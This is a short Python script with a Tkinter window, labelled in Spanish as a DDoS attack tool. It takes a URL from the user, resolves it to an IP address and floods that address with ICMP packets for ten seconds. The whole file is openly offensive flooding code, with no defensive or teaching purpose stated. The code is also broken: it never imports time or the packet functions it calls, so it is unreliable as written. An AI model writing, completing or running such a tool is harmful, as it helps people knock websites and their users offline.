import tkinter as tk
from tkinter import messagebox
import socket
import threading

def ddos_attack(url, duration):
    try:
        target_ip = socket.gethostbyname(url)
        messagebox.showinfo("Info", f"Iniciando ataque DDoS a {target_ip}")
        end_time = time.time() + duration
        while time.time() < end_time:
            packet = IP(dst=target_ip) / ICMP()
            send(packet, verbose=0)
    except Exception as e:
        messagebox.showerror("Error", f"Ocurrió un error: {e}")

def on_attack_button_click():
    url = url_entry.get()
    if url:
        duration = 10  # Duración del ataque en segundos
        attack_thread = threading.Thread(target=ddos_attack, args=(url, duration))
        attack_thread.start()
    else:
        messagebox.showwarning("Advertencia", "Por favor, ingresa una URL válida.")

# Crear la ventana principal
root = tk.Tk()
root.title("Ataque DDoS")

# Etiqueta para solicitar la URL
url_label = tk.Label(root, text="Ingresa la URL:")
url_label.pack(pady=10)

# Campo de entrada para la URL
url_entry = tk.Entry(root, width=50)
url_entry.pack(pady=5)

# Botón para iniciar el ataque
attack_button = tk.Button(root, text="Attackar", command=on_attack_button_click)
attack_button.pack(pady=20)

# Iniciar el bucle principal de la interfaz gráfica
root.mainloop()